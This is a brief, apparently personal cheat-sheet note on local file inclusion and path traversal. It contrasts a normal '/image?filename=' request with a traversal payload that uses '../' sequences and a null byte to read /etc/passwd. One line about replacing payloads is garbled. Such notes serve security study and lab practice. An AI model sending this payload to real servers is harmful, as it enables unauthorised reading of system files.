# LFI
### Directory traversal | File path traversal
Replace LFI payloads:

%00index.html
to
EJP:
```bash
/image?filename=25.jpg
```

```bash
/image?filename=../../../etc/passwd%00.png
```
